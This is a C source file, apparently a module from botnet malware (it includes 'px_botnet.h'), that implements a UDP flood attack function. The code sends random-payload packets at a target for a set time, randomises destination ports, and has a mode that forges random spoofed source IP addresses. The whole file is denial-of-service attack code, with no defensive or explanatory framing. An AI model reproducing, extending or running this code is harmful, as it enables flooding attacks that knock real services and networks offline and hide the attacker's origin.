#include "../../includes/px_botnet.h"

void UDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit)
{
	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if (port == 0)
		dest_addr.sin_port = rand_cmwc();
	else
		dest_addr.sin_port = htons(port);
	if (getHost(target, &dest_addr.sin_addr))
		return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	register unsigned int pollRegister;
	pollRegister = pollinterval;

	if (spoofit == 0)
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (!sockfd)
			return;

		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if (buf == NULL)
			return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while (1)
		{
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			if (i == pollRegister)
			{
				if (port == 0)
					dest_addr.sin_port = rand_cmwc();
				if (time(NULL) > end)
					break;
				i = 0;
				continue;
			}
			i++;
		}
	}
	else
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (!sockfd)return;

		int tmp = 1;
		//if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
		//	return;
		int counter = 50;
		while (counter--)
		{
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}
		in_addr_t netmask;
		if (spoofit == 0)
			netmask = (~((in_addr_t)-1));
		else
			netmask = (~((1 << (32 - spoofit)) - 1));

		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;

		makeRandomStr((unsigned char *)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

		iph->check = csum((unsigned short *)packet, iph->tot_len);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while (1)
		{
			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl(getRandomIP(netmask));
			iph->check = csum((unsigned short *)packet, iph->tot_len);

			if (i == pollRegister)
			{
				if (time(NULL) > end)
					break;
				i = 0;
				continue;
			}
			i++;
		}
	}
}
